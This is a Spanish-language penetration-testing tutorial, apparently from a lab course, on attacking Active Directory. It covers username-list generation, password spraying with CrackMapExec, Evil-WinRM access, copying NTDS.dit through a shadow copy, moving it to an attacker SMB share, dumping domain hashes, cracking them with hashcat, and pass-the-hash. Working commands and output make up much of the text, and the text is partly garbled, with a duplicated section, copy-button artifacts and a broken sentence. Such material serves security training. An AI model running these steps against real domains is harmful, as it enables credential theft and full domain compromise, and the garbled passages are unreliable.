# Attacking Active Directory & NTDS.dit

Active Directory (AD) es un servicio de directorio común y crítico en las redes empresariales modernas. Dado que el AD es algo que encontraremos repetidamente, es importante familiarizarnos con varios métodos que podemos utilizar para atacar y defender estos entornos de AD. Se puede concluir que si una organización utiliza Windows, entonces AD se usa para gestionar esos sistemas Windows. Atacar AD es un tema tan extenso y significativo que tenemos múltiples módulos que cubren AD.

En esta sección, nos centraremos principalmente en cómo podemos extraer credenciales mediante el uso de un ataque de diccionario contra cuentas de AD y el volcado de hashes desde el archivo `NTDS.dit`.

<figure><img src="../../.gitbook/assets/image (705).png" alt=""><figcaption></figcaption></figure>

Como muchos de los ataques que hemos cubierto hasta ahora, nuestro objetivo debe ser alcanzable a través de la red. Esto significa que es muy probable que necesitemos tener un punto de apoyo establecido en la red interna a la que está conectado el objetivo. Dicho esto, hay situaciones en las que una organización puede estar utilizando el reenvío de puertos para redirigir el protocolo de escritorio remoto (3389) u otros protocolos utilizados para el acceso remoto en su enrutador de borde a un sistema en su red interna. Ten en cuenta que la mayoría de los métodos cubiertos en este módulo simulan los pasos después de un compromiso inicial, y se establece un punto de apoyo en una red interna. Antes de poner manos a la obra con los métodos de ataque, consideremos el proceso de autenticación una vez que un sistema Windows se ha unido al dominio. Este enfoque nos ayudará a comprender mejor la importancia de Active Directory y los ataques de contraseña a los que puede ser susceptible.

Una vez que un sistema Windows se une a un dominio, ya no hará referencia de forma predeterminada a la base de datos SAM para validar las solicitudes de inicio de sesión. Ese sistema unido al dominio enviará ahora todas las solicitudes de autenticación para ser validadas por el controlador de dominio antes de permitir que un usuario inicie sesión. Esto no significa que la base de datos SAM ya no se pueda utilizar. Alguien que busque iniciar sesión utilizando una cuenta local en la base de datos SAM aún puede hacerlo especificando el nombre de host del dispositivo seguido del nombre de usuario (Ejemplo: `WS01/nameofuser`) o accediendo directamente al dispositivo y escribiendo `./` en la interfaz de inicio de sesión en el campo de nombre de usuario. Esto es digno de consideración porque necesitamos ser conscientes de qué componentes del sistema se ven afectados por los ataques que realizamos. También puede darnos avenidas adicionales de ataque a considerar al dirigirnos a sistemas operativos de escritorio de Windows o sistemas operativos de servidor de Windows con acceso físico directo o a través de una red. Ten en cuenta que también podemos estudiar ataques a NTDS manteniendo un seguimiento de esta técnica.

## Ataques de Diccionario contra Cuentas de AD usando CrackMapExec

Recuerda que un ataque de diccionario es esencialmente utilizar el poder de una computadora para adivinar un nombre de usuario y/o contraseña utilizando una lista personalizada de posibles nombres de usuario y contraseñas. Puede ser bastante ruidoso (fácil de detectar) realizar estos ataques a través de una red porque pueden generar mucho tráfico de red y alertas en el sistema objetivo, además de que eventualmente pueden ser denegados debido a restricciones en los intentos de inicio de sesión que pueden aplicarse mediante el uso de Políticas de Grupo.

Cuando nos encontramos en un escenario donde un ataque de diccionario es un próximo paso viable, podemos beneficiarnos al intentar personalizar nuestro ataque tanto como sea posible. En este caso, podemos considerar la organización con la que estamos trabajando para realizar la evaluación y usar búsquedas en varios sitios de redes sociales y buscar un directorio de empleados en el sitio web de la empresa. Hacer esto puede resultar en obtener los nombres de los empleados que trabajan en la organización. Uno de los primeros pasos que tomará un nuevo empleado es obtener un nombre de usuario. Muchas organizaciones siguen una convención de nomenclatura al crear nombres de usuario para empleados. Aquí hay algunas convenciones comunes a considerar:

| Convención de Nombre de Usuario      | Ejemplo Práctico para Jane Jill Doe |
| ------------------------------------ | ----------------------------------- |
| primerinicialapellido                | jdoe                                |
| primerinicialsegundoapellidoapellido | jjdoe                               |
| primerapellido                       | janedoe                             |
| primerapellido.segundoapellido       | jane.doe                            |
| segundoapellido.primerapellido       | doe.jane                            |
| apodo                                | doedoehacksstuff                    |

A menudo, la estructura de una dirección de correo electrónico nos dará el nombre de usuario del empleado (estructura: username@domain). Por ejemplo, a partir de la dirección de correo electrónico `jdoe@inlanefreight.com`, vemos que `jdoe` es el nombre de usuario.

> Un consejo de MrB3n: A menudo podemos encontrar la estructura del correo electrónico buscando el nombre de dominio en Google, es decir, “@inlanefreight.com” y obtener algunos correos válidos. A partir de ahí, podemos usar un script para raspar varios sitios de redes sociales y combinar posibles nombres de usuario válidos. Algunas organizaciones intentan ofuscar sus nombres de usuario para prevenir ataques de pulverización, por lo que pueden aliasar su nombre de usuario como `a907` (o algo similar) de regreso a `joe.smith`. De esa manera, los mensajes de correo electrónico pueden pasar, pero el nombre de usuario interno real no se divulga, lo que hace que la pulverización de contraseñas sea más difícil. A veces puedes usar google dorks para buscar “inlanefreight.com filetype:pdf” y encontrar algunos nombres de usuario válidos en las propiedades del PDF si fueron generados con un editor gráfico. Desde allí, es posible que puedas discernir la estructura del nombre de usuario y potencialmente escribir un pequeño script para crear muchas combinaciones posibles y luego pulverizar para ver si alguna regresa válida.

### Creando una lista personalizada de nombres de usuario

Supongamos que hemos realizado nuestra investigación y hemos reunido una lista de nombres basada en información disponible públicamente. Mantendremos la lista relativamente corta por el bien de esta lección, ya que las organizaciones pueden tener un gran número de empleados. Ejemplo de lista de nombres:

* Ben Williamson
* Bob Burgerstien
* Jim Stevenson
* Jill Johnson
* Jane Doe

Podemos crear una lista personalizada en nuestro host de ataque usando los nombres anteriores. Podemos usar un editor de texto basado en línea de comandos como Vim o un editor de texto gráfico para crear nuestra lista. Nuestra lista podría verse algo así:

```bash
Atacando Active Directory & NTDS.dit
sherlock28@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.williamson
williamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Por supuesto, este es solo un ejemplo y no incluye todos los nombres, pero observa cómo podemos incluir diferentes convenciones de nombres para cada nombre si no sabemos ya cuál es la convención utilizada por la organización objetivo.

Podemos crear nuestras listas manualmente o utilizar un generador de listas automatizado, como la herramienta basada en Ruby **Username Anarchy**, para convertir una lista de nombres reales en formatos comunes de nombres de usuario. Una vez que la herramienta ha sido clonada en nuestro host de ataque local usando Git, podemos ejecutarla contra una lista de nombres reales, como se muestra en el ejemplo de salida a continuación:

```bash
Atacando Active Directory & NTDS.dit
sherlock28@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
```

Usar herramientas automatizadas puede ahorrarnos tiempo al crear listas. Sin embargo, nos beneficiará dedicar tanto tiempo como sea posible a intentar descubrir la convención de nombres que está utilizando una organización, ya que esto reducirá la necesidad de adivinar la convención de nombres.

Es ideal limitar tanto como sea posible la necesidad de adivinar al llevar a cabo ataques de contraseñas.

### Lanzando el ataque con CrackMapExec

Una vez que tengamos nuestras listas preparadas o descubramos la convención de nombres y algunos nombres de empleados, podemos lanzar nuestro ataque contra el controlador de dominio objetivo utilizando una herramienta como **CrackMapExec**. Podemos usarla junto con el protocolo SMB para enviar solicitudes de inicio de sesión al controlador de dominio objetivo. Aquí está el comando para hacerlo:

```bash
Atacando Active Directory & NTDS.dit
sherlock28@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (nombre:DC-PAC) (dominio:dac.local) (firma:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

En este ejemplo, CrackMapExec está utilizando SMB para intentar iniciar sesión como usuario (-u) `bwilliamson` utilizando una lista de contraseñas (-p) que contiene una lista de contraseñas comúnmente utilizadas (`/usr/share/wordlists/fasttrack.txt`). Si los administradores configuraron una política de bloqueo de cuenta, este ataque podría bloquear la cuenta que estamos atacando. En el momento de esta escritura (enero de 2022), una política de bloqueo de cuenta no se aplica de forma predeterminada con las políticas de grupo predeterminadas que se aplican a un dominio de Windows, lo que significa que es posible que encontremos entornos vulnerables a este ataque que estamos practicando.

### Registros de eventos del ataque

Puede ser útil saber qué podría haberse dejado atrás después de un ataque. Conocer esto puede hacer que nuestras recomendaciones de remediación sean más impactantes y valiosas para el cliente con el que estamos trabajando. En cualquier sistema operativo Windows, un administrador puede navegar al Visor de eventos y ver los eventos de seguridad para ver las acciones exactas que se registraron. Esto puede informar decisiones para implementar controles de seguridad más estrictos y ayudar en cualquier posible investigación que pueda estar involucrada después de una violación.

Una vez que hayamos descubierto algunas credenciales, podríamos proceder a intentar obtener acceso remoto al controlador de dominio objetivo y capturar el archivo `NTDS.dit`.

## Capturando NTDS.dit

Los **Servicios de Directorio NT (NTDS)** son el servicio de directorio utilizado con **Active Directory (AD)** para encontrar y organizar recursos de red. Recuerda que el archivo `NTDS.dit` se almacena en `%systemroot%/ntds` en los controladores de dominio en un bosque. La extensión `.dit` significa "árbol de información del directorio". Este es el archivo de base de datos principal asociado con AD y almacena todos los nombres de usuario del dominio, hashes de contraseñas y otra información crítica del esquema. Si este archivo puede ser capturado, podríamos comprometer potencialmente cada cuenta en el dominio, de manera similar a la técnica que cubrimos en la sección **Atacando SAM** de este módulo. Al practicar esta técnica, considera la importancia de proteger AD y reflexiona sobre algunas formas de evitar que este ataque ocurra.

### Conectando a un DC con Evil-WinRM

Podemos conectarnos a un **DC (Controlador de Dominio)** objetivo usando las credenciales que capturamos.

```bash
Atacando Active Directory & NTDS.dit
sherlock28@htb[/htb]$ evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

**Evil-WinRM** se conecta a un objetivo utilizando el servicio de **Windows Remote Management** combinado con el **Protocolo de Remoting de PowerShell** para establecer una sesión de PowerShell con el objetivo.

### Verificando la Membresía de Grupos Locales

Una vez conectados, podemos verificar qué privilegios tiene `bwilliamson`. Podemos empezar por ver la membresía de grupos locales usando el comando:

```bash
Atacando Active Directory & NTDS.dit
*Evil-WinRM* PS C:\> net localgroup
```

* _Access Control Assistance Operators_
* _Account Operators_
* _Administrators_
* _Allowed RODC Password Replication Group_
* _Backup Operators_
* _Cert Publishers_
* _Certificate Service DCOM Access_
* _Cryptographic Operators_
* _Denied RODC Password Replication Group_
* _Distributed COM Users_
* _DnsAdmins_
* _Event Log Readers_
* _Guests_
* _Hyper-V Administrators_
* _IIS\_IUSRS_
* _Incoming Forest Trust Builders_
* _Network Configuration Operators_
* _Performance Log Users_
* _Performance Monitor Users_
* _Pre-Windows 2000 Compatible Access_
* _Print Operators_
* _RAS and IAS Servers_
* _RDS Endpoint Servers_
* _RDS Management Servers_
* _RDS Remote Access Servers_
* _Remote Desktop Users_
* _Remote Management Users_
* _Replicator_
* _Server Operators_
* _Storage Replica Administrators_
* _Terminal Server License Servers_
* _Users_
* _Windows Authorization Access Group_

El comando se completó con éxito.

Estamos buscando ver si la cuenta tiene derechos de administrador local. Para hacer una copia del archivo `NTDS.dit`, necesitamos derechos de administrador local (grupo de Administradores) o de administrador de dominio (grupo de Administradores de Dominio) (o equivalente). También queremos verificar qué privilegios de dominio tenemos.

### Verificando los Privilegios de la Cuenta de Usuario, incluyendo Dominio

```bash
Atacando Active Directory & NTDS.dit
*Evil-WinRM* PS C:\> net user bwilliamson
```

**User name:** bwilliamson\
**Full Name:** Ben Williamson\
**Comment:**\
**User's comment:**\
**Country/region code:** 000 (System Default)\
**Account active:** Yes\
**Account expires:** Never

**Password last set:** 1/13/2022 12:48:58 PM\
**Password expires:** Never\
**Password changeable:** 1/14/2022 12:48:58 PM\
**Password required:** Yes\
**User may change password:** Yes

**Workstations allowed:** All\
**Logon script:**\
**User profile:**\
**Home directory:**\
**Last logon:** 1/14/2022 2:07:49 PM

**Logon hours allowed:** All

**Local Group Memberships:**\
**Global Group memberships:** _Domain Users_ _Domain Admins_

El comando se completó con éxito.

Esta cuenta tiene derechos de **Administradores** y **Administradores de Dominio**, lo que significa que podemos hacer casi cualquier cosa que queramos, incluida la creación de una copia del archivo `NTDS.dit`.

### Creando una copia de sombra de C:

Podemos usar `vssadmin` para crear una **Copia de Sombra de Volumen (VSS)** del disco C: o de cualquier volumen que el administrador eligió al instalar AD inicialmente. Es muy probable que NTDS se almacene en C:, ya que esa es la ubicación predeterminada seleccionada durante la instalación, pero es posible cambiar la ubicación. Usamos VSS para esto porque está diseñado para hacer copias de volúmenes que pueden ser leídos y escritos activamente sin necesidad de apagar una aplicación o sistema en particular. VSS es utilizado por muchos programas de respaldo y recuperación de desastres para realizar operaciones.

```bash
Atacando Active Directory & NTDS.dit
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

```mathematica
vssadmin 1.1 - Herramienta de línea de comandos administrativa del servicio de copia de sombra de volumen
(C) Copyright 2001-2013 Microsoft Corp.

Copia de sombra creada con éxito para 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Copiando NTDS.dit desde el VSS

Luego podemos copiar el archivo `NTDS.dit` desde la copia de sombra del volumen C: a otra ubicación en el disco para prepararlo para mover `NTDS.dit` a nuestro host de ataque.

```bash
bashCopiar código  Atacando Active Directory & NTDS.dit
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

```scss
scssCopiar código        1 file(s) copied.
```

Antes de copiar `NTDS.dit` a nuestro host de ataque, es posible que queramos usar la técnica que aprendimos anteriormente para crear un recurso compartido de SMB en nuestro host de ataque. No dudes en volver a la sección **Atacando SAM** para revisar ese método si es necesario.

## Capturando NTDS.dit

Los Servicios de Directorio de NT (NTDS) son el servicio de directorio utilizado con AD para encontrar y organizar recursos de red. Recordemos que el archivo **NTDS.dit** se almacena en **%systemroot%/ntds** en los controladores de dominio en un bosque. La extensión **.dit** significa árbol de información de directorio. Este es el archivo de base de datos principal asociado con AD y almacena todos los nombres de usuario de dominio, hashes de contraseñas y otra información crítica del esquema. Si se puede capturar este archivo, podríamos comprometer potencialmente cada cuenta en el dominio de manera similar a la técnica que cubrimos en la sección **Atacando SAM** de este módulo. Al practicar esta técnica, considera la importancia de proteger AD y piensa en algunas formas de detener este ataque.

### Conectándose a un DC con Evil-WinRM

Podemos conectarnos a un DC objetivo utilizando las credenciales que capturamos.

#### Atacando Active Directory & NTDS.dit

```bash
bashCopiar códigosherlock28@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM se conecta a un objetivo utilizando el servicio de administración remota de Windows combinado con el protocolo de remotos de PowerShell para establecer una sesión de PowerShell con el objetivo.

### Verificando la Membresía de Grupo Local

Una vez conectados, podemos verificar qué privilegios tiene **bwilliamson**. Podemos comenzar mirando la membresía del grupo local utilizando el comando:

#### Atacando Active Directory & NTDS.dit

```bash
bashCopiar código*Evil-Win-RM* PS C:\> net localgroup
```

**Aliases para \DC01**

```plaintext
plaintextCopiar código-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
```

El comando se completó con éxito. Estamos buscando ver si la cuenta tiene derechos de administrador local. Para hacer una copia del archivo **NTDS.dit**, necesitamos derechos de administrador local (grupo Administradores) o de Administrador de Dominio (grupo Administradores de Dominio) (o equivalente). También querremos comprobar qué privilegios de dominio tenemos.

### Verificando los Privilegios de la Cuenta de Usuario, incluyendo Dominio

#### Atacando Active Directory & NTDS.dit

```bash
bashCopiar código*Evil-Win-RM* PS C:\> net user bwilliamson
```

**Información del usuario:**

```plaintext
plaintextCopiar códigoUser name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
```

El comando se completó con éxito. Esta cuenta tiene derechos tanto de Administradores como de Administrador de Dominio, lo que significa que podemos hacer casi cualquier cosa que queramos, incluyendo hacer una copia del archivo **NTDS.dit**.

### Creando una Copia de Sombra de C:

Podemos usar **vssadmin** para crear una copia de volumen sombra (VSS) del disco **C:** o cualquier volumen que el administrador haya elegido al instalar inicialmente AD. Es muy probable que **NTDS** se almacene en **C:**, ya que esa es la ubicación predeterminada seleccionada durante la instalación, pero es posible cambiar la ubicación. Usamos VSS para esto porque está diseñado para hacer copias de volúmenes que pueden ser leídos y escritos activamente sin necesidad de detener una aplicación o sistema particular. VSS es utilizado por muchos softwares diferentes de copia de seguridad y recuperación de desastres para realizar operaciones.

#### Atacando Active Directory & NTDS.dit

```bash
bashCopiar código*Evil-Win-RM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

**Salida de VSS**

```plaintext
plaintextCopiar códigovssadmin 1.1 - Herramienta de línea de comandos administrativa del Servicio de Copia de Sombra de Volumen
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Copiando NTDS.dit desde el VSS

Podemos luego copiar el archivo **NTDS.dit** desde la copia de sombra del volumen **C:** a otra ubicación en el disco para prepararnos para mover **NTDS.dit** a nuestro host de ataque.

#### Atacando Active Directory & NTDS.dit

```bash
bashCopiar código*Evil-Win-RM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

```plaintext
plaintextCopiar código        1 file(s) copied.
```

Antes de copiar **NTDS.dit** a nuestro host de ataque, podríamos querer usar la técnica que aprendimos anteriormente para crear un recurso compartido SMB en nuestro host de ataque. Siéntete libre de volver a la sección **Atacando SAM** para revisar ese método si es necesario.

***

## Transfiriendo NTDS.dit al Host de Ataque

Ahora se puede usar `cmd.exe /c move` para mover el archivo desde el DC objetivo a la carpeta compartida en nuestro host de ataque.

#### Atacando Active Directory & NTDS.dit

```bash
bashCopiar código*Evil-Win-RM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

```plaintext
plaintextCopiar código        1 file(s) moved.
```

### Un Método Más Rápido: Usando cme para Capturar NTDS.dit

Alternativamente, podemos beneficiarnos de usar **CrackMapExec** para llevar a cabo los mismos pasos mostrados anteriormente, todo con un solo comando. Este comando nos permite utilizar VSS para capturar y volcar rápidamente el contenido del archivo **NTDS.dit** convenientemente dentro de nuestra sesión de terminal.

#### Atacando Active Directory & NTDS.dit

```bash
bashCopiar códigosherlock28@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

```plaintext
plaintextCopiar códigoSMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
SMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445     DC01           DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
SMB         10.129.201.57    445     DC01           WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
SMB         10.129.201.57    445     DC01           WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
SMB         10.129.201.57    445     DC01           WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
SMB         10.129.201.57    445     DC01           WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
SMB         10.129.201.57    445     DC01           WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
SMB         10.129.201.57    445     DC01           Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
SMB         10.129.201.57    445     DC01           Administrator:des-cbc-md5:618c1c5ef780cde3
SMB         10.129.201.57    445     DC01           DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
SMB         10.129.201.57    445     DC01           DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
SMB         10.129.201.57    445     DC01           DC01$:des-cbc-md5:a2852362e50eae92
SMB         10.129.201.57    445     DC01           krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
SMB         10.129.201.57    445     DC01           krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
SMB         10.129.201.57    445     DC01           krbtgt:des-cbc-md5:9bd5017fdcea8fae
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
```

```plaintext
plaintextCopiar código[*] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
```

### Cracking Hashes y Obteniendo Credenciales

Podemos proceder creando un archivo de texto que contenga todos los hashes de NT, o podemos copiar y pegar individualmente un hash específico en una sesión de terminal y usar **Hashcat** para intentar romper el hash y obtener una contraseña en texto claro.

#### Rompiendo un Hash Único con Hashcat

```bash
bashCopiar código### Atacando Active Directory & NTDS.dit
sherlock28@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

```plaintext
plaintextCopiar código64f12cddaa88057e06a81b54e73b949b:Password1
```

En muchas de las técnicas que hemos cubierto hasta ahora, hemos tenido éxito al romper hashes que hemos obtenido.

#### ¿Qué pasa si no tenemos éxito en romper un hash?

### Consideraciones de Pass-the-Hash

Aún podemos usar hashes para intentar autenticar a un sistema utilizando un tipo de ataque llamado **Pass-the-Hash (PtH)**. Un ataque PtH aprovecha el protocolo de autenticación **NTLM** para autenticar a un usuario usando un hash de contraseña. En lugar de usar el formato **nombre de usuario**

**ña en texto claro** para el inicio de sesión, podemos usar **nombre de usuariode contraseña**. Aquí hay un ejemplo de cómo funcionaría esto:

#### Pass-the-Hash con Evil-WinRM Ejemplo

```bash
bashCopiar código### Atacando Active Directory & NTDS.dit
sherlock28@htb[/htb]$ evil-winrm -i 10.129.201.57  -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

Podemos intentar utilizar este ataque cuando necesitemos movernos lateralmente a través de una red después de haber comprometido un objetivo inicial. Más sobre PtH se cubrirá en el módulo de Enumeración de AD y Ataques.
